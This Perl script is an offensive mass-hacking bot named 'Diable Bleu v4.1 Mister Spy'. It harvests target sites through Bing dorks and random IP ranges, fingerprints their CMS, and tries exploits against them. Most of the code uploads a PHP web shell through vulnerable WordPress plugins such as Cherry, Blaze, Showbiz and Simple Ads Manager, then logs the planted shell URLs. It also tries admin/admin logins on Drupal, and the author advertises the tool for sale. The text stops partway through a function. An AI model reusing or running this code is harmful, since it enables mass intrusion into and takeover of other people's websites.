#!/usr/bin/perl
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

print color('reset');
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); 
system("title Diable Bleu v4.1 Mister Spy");

}
$mrspy ="
                 (_.--'  |
                  |  ==  |
             o-._ .--..--. _.-o
                 |   ||   |
                  ;--|`--:
                  |. |   |
                  |  ;_ .|
                  |_____ |
                 /|     '|\
                 //`----'\\
                ////|  |  \\
                /   |  |    \
                   /|  |\
                  / \  / \
                 /   \/   \
                /          \
                |          |
               ||    /\    ||
               ||   ,  .   || Mr Spy
     Bot Mister Spy V4\n\tDiable Bleu
";
system("title Diable Bleu v4.1 Mister Spy");

print color 'bold green';
print $mrspy;
print color('reset');
print color('bold white');
print color('reset');
print color 'reset';
print color('bold red'),"[";
print color('bold green'),"1";
print color('bold red'),"] ";
print color('bold white'),"Bot V4\n";
print color('bold red'),"[";
print color('bold green'),"2";
print color('bold red'),"] ";
print color('bold white'),"Bing Dorker\n";
print color('bold red'),"[";
print color('bold green'),"3";
print color('bold red'),"] ";
print color('bold white'),"Beast Mode V4\n";
print color('bold red'),"[";
print color('bold green'),"4";
print color('bold red'),"] ";
print color('bold white'),"Get All Websites\n";
print color('bold red'),"[";
print color('bold green'),"5";
print color('bold red'),"] ";
print color('bold white'),"Get Wordpress Websites\n";
print color('bold red'),"[";
print color('bold green'),"6";
print color('bold red'),"] ";
print color('bold white'),"Get Joomla Websites\n";
print color('bold red'),"[";
print color('bold green'),"7";
print color('bold red'),"] ";
print color('bold white'),"Find Admin Panel\n";
print color('bold red'),"[";
print color('bold green'),"8";
print color('bold red'),"] ";
print color('bold white'),"Ip LookUp\n";
print color('bold red'),"[";
print color('bold green'),"9";
print color('bold red'),"] ";
print color('bold white'),"Shell Finder\n";
print color('bold red'),"[";
print color('bold green'),"10";
print color('bold red'),"] ";
print color('bold white'),"Dump Pass From Config\n";
print color('bold red'),"[";
print color('bold green'),"11";
print color('bold red'),"] ";
print color('bold white'),"Smtp Grabber From Config\n";
print color('bold red'),"[";
print color('bold green'),"12";
print color('bold red'),"] ";
print color('bold white'),"Zone-h Poster\n";
print color('bold red'),"[";
print color('bold green'),"13";
print color('bold red'),"] ";
print color('bold white'),"Tools\n";
print color('bold red'),"[";
print color('bold green'),"14";
print color('bold red'),"] ";
print color('bold white'),"About Me\n";
print color('bold red'),"[";
print color('bold green'),"16";
print color('bold red'),"] ";
print color('bold white'),"Shell Cheker\n";
print color('bold green'),"15";
print color('bold red'),"] ";
print color('bold white'),"Exit\n";

my $whatspywant = <STDIN>;
chomp $whatspywant;
if($whatspywant eq '1'){
bot();
}
if($whatspywant eq '2'){
bing();
}
if($whatspywant eq '3'){
spyx1();
spyx2();
}
if($whatspywant eq '9'){
shellfinder();
}
if($whatspywant eq '4'){
fscoity();
}
if($whatspywant eq '8'){
iplokk();
}
if($whatspywant eq '7'){
adminfinder();
}
if($whatspywant eq '11'){
smtpx();
}
if($whatspywant eq '15'){
exit;
}
if($whatspywant eq '13'){
toolzi();
}
if($whatspywant eq '5'){
getwp();
}
if($whatspywant eq '6'){
getjm();
}
if($whatspywant eq '12'){
zonehposter();
}
if($whatspywant eq '10'){
dumperpassx();
}
if($whatspywant eq '16'){
checkwpspy();
}
if($whatspywant eq '14'){

$logox="  ____               ____             
 |  _ \             |  _ \            
 | |_) |_   _  ___  | |_) |_   _  ___ 
 |  _ <| | | |/ _ \ |  _ <| | | |/ _ \
 | |_) | |_| |  __/ | |_) | |_| |  __/
 |____/ \__, |\___| |____/ \__, |\___|
         __/ |              __/ |     
        |___/              |___/      <3
		peace Ya Men
		";
$DELAY = ($ARGV[0] =~ /^-([.\d]+)/) ? (shift, $1) : 1;
$| = 1;
$_ ="Name : Mister Spy
For sell by Owner Only
Contact Me with Facebook : https://www.facebook.com/007MrSpy\nOr icq : 712083179\nemail : moetazbusiness @ gmail.com\nIf the tool leaked Do Not contact me For more information\n\n";
while ($_) {
    for (split(//)) {
            print;
                    select(undef,undef,undef, 0.005 * 20);
                      }
        $_ = "";
           }
print color 'bold red';
print $logox;

}
sub bing(){
system('cls');


$logo="
  ____  _               _____             _             
 |  _ \(_)             |  __ \           | |            
 | |_) |_ _ __   __ _  | |  | | ___  _ __| | _____ _ __ 
 |  _ <| | '_ \ / _` | | |  | |/ _ \| '__| |/ / _ \ '__|
 | |_) | | | | | (_| | | |__| | (_) | |  |   <  __/ |   
 |____/|_|_| |_|\__, | |_____/ \___/|_|  |_|\_\___|_|   
                  __/ |                                  
                 |___/                                                     
";
print $logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] Random Ip Genrator \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
spyzonesone();
}
}


if($targett eq '2')
{
fscoity();
sub fscoity(){
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}

}
}
if($targett eq '3')
{
spyx2();
sub spyx2(){
print "[Put A Ip List chen3a.txt]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
}

}
}
}

if($targett eq '4')
{
spyx1();
sub spyx1(){
srand(time() ^ ($$ + ($$ << 15)));
print "Welcome to the ip Genrator how much ip u want ?\n";
my $ipnumspy = <STDIN>;
chomp $ipnumspy;

for (1..$ipnumspy){
    print $spx = join ('.', (int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))
                     ,int(rand(255))))

          , "\n";
		  open(save, '>>chen3a.txt');
    print save "$spx\n";
    close(save);

}
}
}

else{
print color("red"), "Not Found\n";
print color('reset');
}
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
spyzonesone();

}
minibot();
open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipsdumpdv3.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
spyzonesone();
minibot();


}
####################################"
sub spyzonesone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tobotv3.txt');
    print savea "$link\n";
    close(savea);
	

						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub spyzonesonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>urldumpdv3.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"tobotv3.txt") or die "$!";
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","tobotv3.txt";
print HANDLE "";
close HANDLE;
}
}
sub bot(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filter();
}
sub getwp(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filterwp();
}
}
sub getjm(){ 
print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filterjm();
}
}
sub filterwp($site){
################ CMS Filter wordpress only #####################
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
     print color('bold white'), "[-] $site";	
     print color("bold green"), " - WordPress\n\n";print color('reset');
     open(save, '>>sites/wordpress.txt');
     print save "$site\n";
     close(save);
}else{
print "Not Wordpress -$site\n";
}
}
sub filterjm($site){
################ CMS Filter Joomla only #####################
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
     print color('bold white'), "[-] $site";	
     print color("bold green"), " - Joomla\n\n";print color('reset');
     open(save, '>>sites/Joomla.txt');
     print save "$site\n";
     close(save);
}else{
print "Not Joomla -$site\n";
}
}


sub filter($site){

################ CMS Filter #####################
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
     print color('bold white'), "[-] $site";	
     print color("bold green"), " - WordPress\n\n";print color('reset');
     open(save, '>>sites/wordpress.txt');
     print save "$site\n";
     close(save);
	 wpmobiledetector();
     wpinjetc();
     revshell();
     gravity();
     upindex();
     getconfig();
     jombmang();
     formcraft();
     addblockblocker();
     blaze();
     catpro();
     cherry();
     downloadsmanager();
     powerzoomer();
     showbiz();
     ads();
     slideshowpro();
     inboundiomarketing();
     dzszoomsounds();
     reflexgallery();
     sexycontactform();
     wtffu();
     phpeventcalendar();
     synoptic();
     Wpshop();
}

elsif($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
     print color('bold white'),"[-] $site";	
     print color("bold green"), " - Joomla\n\n";         print color('reset');
     open(save, '>>sites/joomla.txt');
     print save "$site\n";
     close(save);
	 comweblinks();
	 jceshell();
     comjce();
     comediaindex();
     comjdowloads();
     comfabr();
     indecomfabr();
     mods();
	 comadsmanegr();
}elsif($spyxy =~/Drupal|drupal|sites\/all|drupal.org/) {
     print color('bold white'),"[-] $site";	
     print color("bold green"), " - Drupal\n\n";     print color('reset');
     open(save, '>>sites/DRUPAL.txt');
     print save "$site\n";
     close(save);
     Drupal();
}elsif($cms =~/Prestashop|prestashop/) {
    print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Prestashop\n\n";
    print color('reset');
    open(save, '>>tmp/Prestashop.txt');
    print save "$site\n";   
    close(save);

     columnadverts();
     soopamobile();
     soopabanners();
     vtermslideshow();
     simpleslideshow();
     productpageadverts();
     homepageadvertise();
     homepageadvertise2();
     jro_homepageadvertise();
     attributewizardpro();
     oneattributewizardpro();
     attributewizardproOLD();
     attributewizardpro_x();
     advancedslider();
     cartabandonmentpro();
     cartabandonmentproOld();
     videostab();
     wg24themeadministration();
     fieldvmegamenu();
     wdoptionpanel();
     pk_flexmenu();
     pk_vertflexmenu();
     nvn_export_orders();
     megamenu();
     tdpsthemeoptionpanel();
     psmodthemeoptionpanel();
     masseditproduct();
}
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
     print color('bold white'),"[-] $site";	
     print color("bold green"), " - Magento\n\n";     print color('reset');
     open(save, '>>sites/Magento.txt');
     print save "$site\n";
     close(save);
	 magento();
}elsif($spyxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
	 print color('bold white'),"[-] $site";	
     print color("bold white"), " - OpenCart\n\n";     print color('reset');
     open(save, '>>sites/vbulletin.txt');
     print save "$site\n";
     close(save);
}elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/){
     print color('bold white'),"[-] $site";	
     print color("bold green"), " - vBulletin\n\n";     print color('reset');
     open(save, '>>sites/vbulletin.txt');
     print save "$site\n";
     close(save);
}else{
	 print color('bold white'),"[-] $site";	
     print  color("bold red"), " - Unknown\n\n";     print color('reset');
}
}

#  _____                         _ 
# |  __ \                       | |
# | |  | |_ __ _   _ _ __   __ _| |
# | |  | | '__| | | | '_ \ / _` | |
# | |__| | |  | |_| | |_) | (_| | |
# |_____/|_|   \__,_| .__/ \__,_|_|
#                   | |            
#                   |_|     
       
################ Drupal  Exploit #####################

sub Drupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Drupal] ............................. ";


$drupalink = "http://localhost/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
$admin ="admin";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Result_v4/brute.txt');
    print save "[Drupal] $site | username : admin | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
    }
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}

#  __  __                        _        
# |  \/  |                      | |       
# | \  / | __ _  __ _  ___ _ __ | |_ ___  
# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \ 
# | |  | | (_| | (_| |  __/ | | | || (_) |
# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/ 
#                __/ |                    
#               |___/        
             
################ Magento Exploit #####################

sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Magento] ............................ ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>Result_v4/Brute.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Faile]\n";
    print color('reset');


        }

}



#                 ______            
#                |  ____|           
# __      ___ __ | |__  __  ___ __  
# \ \ /\ / / '_ \|  __| \ \/ / '_ \ 
#  \ V  V /| |_) | |____ >  <| |_) |
#   \_/\_/ | .__/|______/_/\_\ .__/ 
#          | |               | |    
#          |_|               |_|    

################ Adblock Blocker #####################

sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["spyx.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/spyx.php?X=sphinx";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Adblock Blocker]";
print color('bold white')," ................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $addblockup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Adblock Blocker]";
print color('bold white')," ................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";}
}


################ Blaze #####################

sub blaze(){

my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["spyx.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/spyx.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/spyx.php?X=sphinx";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Blaze]";
print color('bold white')," ............................. ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $blazeup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Blaze]";
print color('bold white')," ............................. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Catpro #####################

sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["spyx.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/spyx.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/spyx.php?X=sphinx";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Catpro]";
print color('bold white')," ............................ ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $catproup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Catpro]";
print color('bold white')," ............................ ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Cherry Plugin #####################

sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["spyx.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/spyx.php?X=sphinx";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Cherry Plugin]";
print color('bold white')," ..................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cherryup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Cherry Plugin]";
print color('bold white')," ..................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}

################ Download Manager #####################

sub downloadsmanager(){

$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["spyx.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/spyx.php?X=sphinx";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Mister Spy/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Download Manager]";
print color('bold white')," .................. ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dmup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Download Manager]";
print color('bold white')," .................. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}


################ Power Zoomer #####################

sub powerzoomer(){ 

my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["spyx.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/spyx.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/spyx.php?X=sphinx";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Power Zoomer]";
print color('bold white')," ...................... ";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Power Zoomer]";
print color('bold white')," ...................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}
}

################ Showbiz #####################

sub showbiz(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Showbiz] ........................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
sub upxx(){
my $zip_sho = "showbiztaz.zip";
my $action_sho = "showbiz_ajax_action";
my $update_file_sho = "$zip_sho";
my $path = "wp-admin/admin-ajax.php";
my $shell_path_sho = "wp-content/plugins/showbiz/temp/update_extract/showbiz/sxv3.php";

my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "$action_sho", client_action => "update_plugin", update_file => ["$update_file_sho"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/){
my $conte = $ua->get("$site/$shell_path_sho")->content;
  if ($conte =~/Mister Spy/){
     print color('bold green');
     print "[Sucess]\n";
     print color('reset');
     open (DONE, '>>Result_v4/Shell3z.txt');
     print DONE "$site/$shell_path_sho\n";
}else{
     print color('bold red');
     print  "[Failed]\n";
     print color('reset');}
}elsif ($exploit->decoded_content =~ /Wrong request/) {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}

elsif ($exploit->decoded_content =~ m/0$/) {
     print color('bold red');
     print  "[Failed]\n";
     print color('reset');
}

else {
$exploit->decoded_content =~ /<\/b>(.*?)<br>/;
     print color('bold red');
     print  "[Failed]\n";
     print color('reset');
}
}
upxx();

}

################ Simple Ads Manager #####################

sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["spyx.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/spyx.php?X=sphinx";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Simple Ads Manager]";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $adsup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Simple Ads Manager]";
print color('bold white')," ................ ";
print color('bold red'),"[Failed]\n";
}
}

################ Slide Show Pro #####################

sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["spyx.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/spyx.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/spyx.php?X=sphinx";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Slide Show Pro]";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sspup\n";
open (TEXT, '>>Result_v4/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Slide Show Pro]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]\n";
}
}

################ WP Mobile Detc #####################

sub wpmobiledetector(){ 

